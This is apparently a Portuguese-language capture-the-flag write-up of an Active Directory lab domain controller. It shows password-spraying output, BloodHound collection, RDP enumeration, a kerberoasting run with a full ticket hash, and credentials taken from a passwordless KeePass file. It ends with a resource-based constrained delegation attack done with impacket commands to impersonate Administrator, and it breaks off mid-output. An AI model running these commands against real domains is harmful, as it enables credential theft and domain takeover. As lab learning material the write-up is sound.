SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HelpDesk2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HD2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HelpDesk2022 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HelpDesk2022 STATUS_LOGON_FAILURE 

```
Depois de descobrir a senha do t.jones e vasculhar o sistema como t.jones e não ter encontrado nada eu resolvi fazer pulverização de senha usando a senha dele , e com isso a senha dele era a mesma de r.william e svc.scanner porém svc.scanner foi desativada ou algo do tipo pois fui rebaixado para guest na pulverização.
```
nxc smb 10.65.146.61 -u users.txt -p 'Helpdesk01!' --continue-on-success 
SMB         10.65.146.61    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:Helpdesk01! STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [+] ctf.local\t.jones:Helpdesk01! 
SMB         10.65.146.61    445    DC01             [-] ctf.local\j.smith:Helpdesk01! STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [+] ctf.local\svc.scanner:Helpdesk01! (Guest)
SMB         10.65.146.61    445    DC01             [+] ctf.local\r.williams:Helpdesk01!
```
### impacket-GetNPUsers
```
impacket-GetNPUsers ctf.local/ -dc-ip ctf.local -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User t.jones doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc.helpdesk doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```
Nenhum deles tem pré autenticação ativada.

### BloodHound (j.smith)
Primeiro iremos usar o coletor python do bloodhound e depois jogar no bloodhound em si.
```
bloodhound-python -u j.smith -p JSmith@IT2024 -d ctf.local -ns 10.65.146.61 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 30S
INFO: Compressing output into 20260917144822_bloodhound.zip
```

![[Pasted image 20260917163445.png]]
Aqui vemos que o svc.helpdesk é uma conta que podemos fazer kerberoasting , basicamente podemos pedir um tgs para o dc e ele nos devolve , no caso o tgs é baseado em um hash feito com a senha da conta de serviço , com isso se a senha for fraca podemos quebrar esse hash e recuperar ela.

![[Pasted image 20260917163028.png]]
Vemos que de R.Williams podemos chegar em Administrator por esse path que o bloodhound achou.

### Bloodhound (t.jones)
Como estamos aqui em um ctf para aprender vou executar bloodhound como t.jones , o que as vezes não precisava , não seria tão útil e geraria vários alertas mas é uma máquina de testes.
Irei ver se consigo complementar o resultado do j.smith com o t.jones e achar mais coisas que o bloodhound pode me mostrar.

### Bloodhound (r.williams)
Essa fase será a fase que como r.williams eu irei executar o vetor de ataque via AddAllowedToAct para conseguir ser administrator.

Iremos usar um ataque que chama rbcd , na qual a gente tem permissao de AddAllowedToAct no host que é o DC01.CTF.LOCAL e com isso iremos adicionar uma conta de computador a esse host , pois nosso usuário tem permissão de editar uma lista de controle que diz quais contas/computadores podem solicitar bilhetes TGS em meu nome para fingir ser qualquer outro usuário? basicamente o DC01 que pode solicitar TGS mas aí no caso iremos editar essa lista e iremos criar uma conta de computador que iremos inserir ela na lista e com ela iremos pedir tgs e impersonar como admin já que ele não é tratado como user protegido e pode ser delegado.
Passo a passo na seção exploração.

### Enumeração manual via RDP (j.smith)
Como vimos no enum4linux o j.smith participa do grupo Remote Desktop Users que induz a entendermos que podemos usar o rdp para fazer login com suas credenciais no domínio, assim iremos acessar via RDP e enumerar manualmente.
```
PS C:\Users\j.smith> systeminfo

Host Name:                 DC01
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA070
Original Install Date:     3/17/2021, 2:59:06 PM
System Boot Time:          9/17/2026, 5:31:53 PM
System Manufacturer:       Amazon EC2
System Model:              t3a.medium
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,048 MB
Available Physical Memory: 2,567 MB
Virtual Memory: Max Size:  4,752 MB
Virtual Memory: Available: 3,295 MB
Virtual Memory: In Use:    1,457 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    ctf.local
Logon Server:              \\DC01
Hotfix(s):                 27 Hotfix(s) Installed.
                           [01]: KB4601555
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4486153
                           [06]: KB4493510
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4535680
                           [14]: KB4539571
                           [15]: KB4549947
                           [16]: KB4558997
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4577586
                           [21]: KB4577667
                           [22]: KB4587735
                           [23]: KB4589208
                           [24]: KB4598480
                           [25]: KB4601393
                           [26]: KB5000859
                           [27]: KB5001568
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.65.128.1
                                 IP address(es)
                                 [01]: 10.65.146.61
                                 [02]: fe80::59d8:1071:b6dd:69f7
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\Users\j.smith> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ============================================
ctf\j.smith S-1-5-21-1966530601-3185510712-10604624-1609
```

```
PS C:\Users\j.smith> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ============================================
ctf\j.smith S-1-5-21-1966530601-3185510712-10604624-1609


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
CTF\AppLocker-Restricted                   Alias            S-1-5-21-1966530601-3185510712-10604624-1614 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
Vemos que temos permissão de trafegar por diretorios mesmo que não temos permissão específica de navegar em diretórios intermediários entre eles , podendo assim entrarmos em muitos diretórios.
```
PS C:\Users\j.smith> wmic service get name,StartName
Name                                      StartName
ADWS                                      LocalSystem
AJRouter                                  NT AUTHORITY\LocalService
ALG                                       NT AUTHORITY\LocalService
AmazonSSMAgent                            LocalSystem
AppIDSvc                                  NT Authority\LocalService
Appinfo                                   LocalSystem
AppMgmt                                   LocalSystem
AppReadiness                              LocalSystem
AppVClient                                LocalSystem
AppXSvc                                   LocalSystem
AudioEndpointBuilder                      LocalSystem
Audiosrv                                  NT AUTHORITY\LocalService
AWSLiteAgent                              LocalSystem
AxInstSV                                  LocalSystem
BFE                                       NT AUTHORITY\LocalService
BITS                                      LocalSystem
BrokerInfrastructure                      LocalSystem
BTAGService                               NT AUTHORITY\LocalService
BthAvctpSvc                               NT AUTHORITY\LocalService
bthserv                                   NT AUTHORITY\LocalService
camsvc                                    LocalSystem
CDPSvc                                    NT AUTHORITY\LocalService
CertPropSvc                               LocalSystem
cfn-hup                                   LocalSystem
ClipSVC                                   LocalSystem
COMSysApp                                 LocalSystem
CoreMessagingRegistrar                    NT AUTHORITY\LocalService
CryptSvc                                  NT Authority\NetworkService
CscService                                LocalSystem
DcomLaunch                                LocalSystem
defragsvc                                 localSystem
DeviceAssociationService                  LocalSystem
DeviceInstall                             LocalSystem
DevQueryBroker                            LocalSystem
Dfs                                       LocalSystem
DFSR                                      LocalSystem
Dhcp                                      NT Authority\LocalService
diagnosticshub.standardcollector.service  LocalSystem
DiagTrack                                 LocalSystem
DmEnrollmentSvc                           LocalSystem
dmwappushservice                          LocalSystem
DNS                                       LocalSystem
Dnscache                                  NT AUTHORITY\NetworkService
DoSvc                                     NT Authority\NetworkService
dot3svc                                   localSystem
DPS                                       NT AUTHORITY\LocalService
DsmSvc                                    LocalSystem
DsSvc                                     LocalSystem
Eaphost                                   localSystem
EFS                                       LocalSystem
embeddedmode                              LocalSystem
EntAppSvc                                 LocalSystem
EventLog                                  NT AUTHORITY\LocalService
EventSystem                               NT AUTHORITY\LocalService
fdPHost                                   NT AUTHORITY\LocalService
FDResPub                                  NT AUTHORITY\LocalService
FontCache                                 NT AUTHORITY\LocalService
FrameServer                               NT AUTHORITY\LocalService
gpsvc                                     LocalSystem
GraphicsPerfSvc                           LocalSystem
hidserv                                   LocalSystem
HvHost                                    LocalSystem
icssvc                                    NT Authority\LocalService
IKEEXT                                    LocalSystem
InstallService                            LocalSystem
iphlpsvc                                  LocalSystem
IsmServ                                   LocalSystem
Kdc                                       LocalSystem
KdsSvc                                    LocalSystem
KeyIso                                    LocalSystem
KPSSVC                                    NT AUTHORITY\NetworkService
KtmRm                                     NT AUTHORITY\NetworkService
LanmanServer                              LocalSystem
LanmanWorkstation                         NT AUTHORITY\NetworkService
lfsvc                                     LocalSystem
LicenseManager                            NT Authority\LocalService
lltdsvc                                   NT AUTHORITY\LocalService
lmhosts                                   NT AUTHORITY\LocalService
LSM
MapsBroker                                NT AUTHORITY\NetworkService
MDCoreSvc                                 LocalSystem
mpssvc                                    NT Authority\LocalService
MSDTC                                     NT AUTHORITY\NetworkService
MSiSCSI                                   LocalSystem
msiserver                                 LocalSystem
NcaSvc                                    LocalSystem
NcbService                                LocalSystem
Netlogon                                  LocalSystem
Netman                                    LocalSystem
netprofm                                  NT AUTHORITY\LocalService
NetSetupSvc
NetTcpPortSharing                         NT AUTHORITY\LocalService
NgcCtnrSvc                                NT AUTHORITY\LocalService
NgcSvc                                    LocalSystem
NlaSvc                                    NT AUTHORITY\NetworkService
nsi                                       NT Authority\LocalService
NtFrs                                     LocalSystem
PcaSvc                                    LocalSystem
PerfHost                                  NT AUTHORITY\LocalService
PhoneSvc                                  NT Authority\LocalService
pla                                       NT AUTHORITY\LocalService
PlugPlay                                  LocalSystem
PolicyAgent                               NT Authority\NetworkService
Power                                     LocalSystem
PrintNotify                               LocalSystem
ProfSvc                                   LocalSystem
PushToInstall                             LocalSystem
QWAVE                                     NT AUTHORITY\LocalService
RasAuto                                   localSystem
RasMan                                    localSystem
RemoteAccess                              localSystem
RemoteRegistry                            NT AUTHORITY\LocalService
RmSvc                                     NT AUTHORITY\LocalService
RpcEptMapper                              NT AUTHORITY\NetworkService
RpcLocator                                NT AUTHORITY\NetworkService
RpcSs                                     NT AUTHORITY\NetworkService
RSoPProv                                  LocalSystem
sacsvr                                    LocalSystem
SamSs                                     LocalSystem
SCardSvr                                  NT AUTHORITY\LocalService
ScDeviceEnum                              LocalSystem
Schedule                                  LocalSystem
SCPolicySvc                               LocalSystem
seclogon                                  LocalSystem
SecurityHealthService                     LocalSystem
SEMgrSvc                                  NT AUTHORITY\LocalService
SENS                                      LocalSystem
Sense                                     LocalSystem
SensorDataService                         LocalSystem
SensorService                             LocalSystem
SensrSvc                                  NT AUTHORITY\LocalService
SessionEnv                                localSystem
SgrmBroker                                LocalSystem
SharedAccess                              LocalSystem
ShellHWDetection                          LocalSystem
shpamsvc                                  LocalSystem
smphost                                   NT AUTHORITY\NetworkService
SNMPTRAP                                  NT AUTHORITY\LocalService
Spooler                                   LocalSystem
sppsvc                                    NT AUTHORITY\NetworkService
SSDPSRV                                   NT AUTHORITY\LocalService
ssh-agent                                 LocalSystem
SstpSvc                                   NT Authority\LocalService
StateRepository                           LocalSystem
stisvc                                    NT Authority\LocalService
StorSvc                                   LocalSystem
svsvc                                     LocalSystem
swprv                                     LocalSystem
SysMain                                   LocalSystem
SystemEventsBroker                        LocalSystem
TabletInputService                        LocalSystem
tapisrv                                   NT AUTHORITY\NetworkService
TermService                               NT Authority\NetworkService
Themes                                    LocalSystem
TieringEngineService                      localSystem
TimeBrokerSvc                             NT AUTHORITY\LocalService
TokenBroker                               LocalSystem
TrkWks                                    LocalSystem
TrustedInstaller                          localSystem
tzautoupdate                              NT AUTHORITY\LocalService
UALSVC                                    LocalSystem
UevAgentService                           LocalSystem
UmRdpService                              localSystem
upnphost                                  NT AUTHORITY\LocalService
UserManager                               LocalSystem
UsoSvc                                    LocalSystem
VaultSvc                                  LocalSystem
vds                                       LocalSystem
vmicguestinterface                        LocalSystem
vmicheartbeat                             LocalSystem
vmickvpexchange                           LocalSystem
vmicrdv                                   LocalSystem
vmicshutdown                              LocalSystem
vmictimesync                              NT AUTHORITY\LocalService
vmicvmsession                             LocalSystem
vmicvss                                   LocalSystem
VSS                                       LocalSystem
W32Time                                   NT AUTHORITY\LocalService
WaaSMedicSvc                              LocalSystem
WalletService                             LocalSystem
WarpJITSvc                                NT Authority\LocalService
WbioSrvc                                  LocalSystem
Wcmsvc                                    NT Authority\LocalService
WdiServiceHost                            NT AUTHORITY\LocalService
WdiSystemHost                             LocalSystem
WdNisSvc                                  NT AUTHORITY\LocalService
Wecsvc                                    NT AUTHORITY\NetworkService
WEPHOSTSVC                                NT AUTHORITY\LocalService
wercplsupport                             localSystem
WerSvc                                    localSystem
WiaRpc                                    LocalSystem
WinDefend                                 LocalSystem
WinHttpAutoProxySvc                       NT AUTHORITY\LocalService
Winmgmt                                   localSystem
WinRM                                     NT AUTHORITY\NetworkService
wisvc                                     LocalSystem
wlidsvc                                   LocalSystem
wmiApSrv                                  localSystem
WMPNetworkSvc                             NT AUTHORITY\NetworkService
WPDBusEnum                                LocalSystem
WpnService                                LocalSystem
WSearch                                   LocalSystem
wuauserv                                  LocalSystem
CaptureService_148ae2
cbdhsvc_148ae2
CDPUserSvc_148ae2
ConsentUxUserSvc_148ae2
DevicePickerUserSvc_148ae2
DevicesFlowUserSvc_148ae2
PimIndexMaintenanceSvc_148ae2
PrintWorkflowUserSvc_148ae2
UnistoreSvc_148ae2
UserDataSvc_148ae2
WpnUserService_148ae2
```
Listei também via schtasks e gerou uma lista enorme que mandei pra IA avaliar se havia algum script de rotina fora do normal das tarefas rotineiras do windows e nao havia.

Vasculhando as pastas padrões do usuário eu encontrei um arquivo chamado database.kdbx , com isso olhei nos programas e achei o KeePass que abre esse tipo de arquivo e cliquei . Pediu uma senha e dei enter sem senha pois não sabia senha alguma , consegui acesso ;-; , um banco de dados sem senha . Nisso achei 3 registros de user e senha , que irei colocar na sessão documentada de usuários e credenciais.
```
nxc smb 10.65.146.61 -u 't.jones' -p 'Helpdesk01!'
SMB         10.65.146.61    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.65.146.61    445    DC01             [+] ctf.local\t.jones:Helpdesk01!
```
Aqui conseguimos comprovar que é uma credenciai verdadeira para t.jones , logo podemos agora enumerar como t.jones.

### Enumeração manual rdp (t.jones)
O usuário t.jones não tem nada que nos ajuda , seus privilégios são os mesmo do j.smith e não temos informações a retirar de sua conta.
### Kerberoasting
```
impacket-GetUserSPNs ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.65.146.61 -request 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name          MemberOf  PasswordLastSet             LastLogon                   Delegation  
-----------------------  ------------  --------  --------------------------  --------------------------  -----------
helpdesk/DC01            svc.helpdesk            2026-05-20 14:35:56.137405  2026-05-20 14:35:14.951529  constrained 
helpdesk/DC01.ctf.local  svc.helpdesk            2026-05-20 14:35:56.137405  2026-05-20 14:35:14.951529  constrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc.helpdesk$CTF.LOCAL$ctf.local/svc.helpdesk*$258a583a31572383b2405d9f82dc38e6$e9f79fd82ffd5fc395d1cab12de0153930815195c8bf31b3958e14766fe57c7fe869ff5319567bab9e55a2336cd9db446515f91d14a42ed77a9a0b085094bbf3ba15dd7cfadcb541ce75f74286aa95ccc8c274b89033ffe2a54101d8e67635bbc8b06116529bda65ac6eaf26b06035ef0f8843561a5d4337faa3bbee662d4f79d15a2f21e59a5f186943a612ff5bbf81a89e4678daba4f1e1f42f11210beac04721fba1165245c3c8fd307acc69b4ec07f7929333022a1cfdf2fce80f7ec21a0596ba321d9a97a5ec2912df7c102bacef2220dae34e85651c02baf926aa517b82ceac644a27a94dfb5314e04ff5f366dbd31e8a9e67dcd9ae3a43a3c8275975e6bc3e3c72ea50b8a6be99d64556674d098d57697420a1e2c2a1812f59f5960eeb48fe8eb4d41fa7949ef41186f7fbcbc777e1da477cb034317c7593fc25251789ad1530939e2ea45446a7ab299ee17a1efeeb142e7a82a62d9ceef0abebb87e820d8017d1e5d2f07a9b95faddf5dd725213f35ebf3f603e0a575ab0230ddb16415966bea6522082392e1b7cad4e17c9c682e2084bc0254d0c096d5cb70a12909a47f393df31c5918bf150228bb038abfd71954ee9ef73db0a8fecec6d07f3ab6af1ab2bf1f4ddf1964cf2a68553ed4c10539d581e62667022ea91b790939ba181cef32fd72d2678cd02b37ee097ef57f5be3de56f6747d21a3bc48ffeddc360482d7db5fdb3798d96346f21445b682905b61290de6f7e91b6acd65458318154d50a8957163a599503c53e97d158fa6e9a06d1907276451e4720070c36ebcb40b71a1d6176980dcd258961f14904294ddba214f728249d9e8f13f798964bf00e678018ff12edf006cfe67eb161a134689aef2ffea690491a7188121fefd1d548c7f97b29079b91d59bf3f0d08838e6c90173f8d249373bb8e21e03b76495f76420ff1db2e4a92598097e2f4cd932297e5e438a90e7ed3c64f751ffd59e83ccbfd6bfa2938d5cc8387d12d7aec94afd1a0a641e1c60e14dfa6c77d07401477248159bde9434cb2977d63306ee5adaf2c3214d0869bf169bc67a11ae289786cff8a07130ddbfc003fe5b8975c8b51020af7c474be7c1f4f358ff6c8aca8b818cc67f8e9f219113bcae41635207da4b15da358d925f4bac1bbd86158b2e375ea9f28371122a380feae6044ea7936ea6479be7f86482c1beb651386047623116b8d378b5217fb21a6f3828071b935fa1d2397fdf179aec86571ae09da96efa34cc368430fc8c466e3dbf510c6e3f2d1de0744fc5c5b25956dedab36ffcc50432e8a01c3be8a163e3a62b083633eeff4ab
```
Pelo bloodhound vimos que poderíamos fazer kerberoasting no svc.helpdesk e com isso usamos o script do impacket para solicitar um TGS e pegarmos o hash , mas via hashcat e várias wordlists vemos que a senha não é "conhecida".Utilizei umas 15 listas diferentes começando pela rockyou.

### SMBmap (t.jones)
```
smbmap -u 't.jones' -p 'Helpdesk01!' -H 10.65.146.61

[+] IP: 10.65.146.61:445        Name: DC01.ctf.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Downloads                                               READ ONLY       File drop share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```
Aqui usei smbmap para ver se haviamos conseguido permissões diferentes quantos aos smb mas temos as mesmas que j.smith.

### SMBmap (r.williams)
```
smbmap -u 'r.williams' -p 'Helpdesk01!' -H 10.65.146.61

[+] IP: 10.65.146.61:445        Name: DC01.ctf.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Downloads                                               READ ONLY       File drop share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```

### Enumeração manual RDP (r.williams)

Ele possue os mesmos privilégios dos outros usuários que passamos , mas ele está em um grupo diferente que chama CTF/sysadmin
```
PS C:\Users\r.williams.CTF> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
ctf\r.williams S-1-5-21-1966530601-3185510712-10604624-1611


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes     
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
CTF\sysadmin                               Alias            S-1-5-21-1966530601-3185510712-10604624-1613 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```


---

## ⚡ 2. Exploração & Acesso Inicial (Foothold)

> [!failure] Vulnerabilidade Detectada: 
> **Parâmetro Vulnerável:** Não ter senha no database.kdbx , expondo as credenciais do t.jones
> **Tipo:** Credenciais expostas em texto simples e um local sem senha
> **Mecanismo:** Exploração pela interface

>[!failure] Vulnerabilidade Detectada: 
> **Parâmetro Vulnerável:** Mesma senha utilizada para múltiplas contas
> **Tipo**: Reutilização de senha 
> **Mecanismo:** Pulverização da senha de t.jones em todos os usuários , assim descobrindo a senha de svc.scanner e r.williams

>[!failure] Vulnerabilidade Detectada: 
> **Parâmetro Vulnerável:** Marked Sensitive em admin como false , além da permissão para r.williams editar o DACL de contas de usuários/computadores que podem se passar pelo DC01 para solicitar tickets de serviço
> **Tipo:** Ataque RBCD
> **Mecanismo:** Uso de scripts impacket para adicionar computador , delegar autroridade para o computador criado para se passar pelo DC01 para pedir tickets e solicitar ticket de serviço se impersonando como admin utilizando a conta de computador criada e assim guardando o TGS localmente em arquivo .cache para utilização.

Passo a passo:

Primeiro passo criamos a conta de computador
```
impacket-addcomputer 'ctf.local/r.williams:Helpdesk01!' -dc-ip 10.65.146.61 -computer-name "TESTECOMP$" -computer-pass 'SenhaSegura123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account TESTECOMP$ with password SenhaSegura123!.
```
Com essa conta iremos usar um outro script do impacket que permite que faça o rbcd com write escrevendo na lista DACL que dita os computadores que podem se passar pelo DC01.
```
impacket-rbcd -dc-ip 10.65.146.61 -action write -delegate-to 'DC01$' -delegate-from 'TESTECOMP$' 'ctf.local/r.williams:Helpdesk01!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TESTECOMP$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TESTECOMP$   (S-1-5-21-1966530601-3185510712-10604624-3109)
```
Assim tendo editado agora podemos simplesmente usar o script do impacket que permite que peçamos o ticket de serviço como admin e recuperemos o TGT , mas usando a conta de computador que criamos.
```
impacket-getST -impersonate Administrator -spn cifs/DC01.ctf.local 'ctf.local/TESTECOMP$:SenhaSegura123!' -dc-ip 10.65.146.61
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
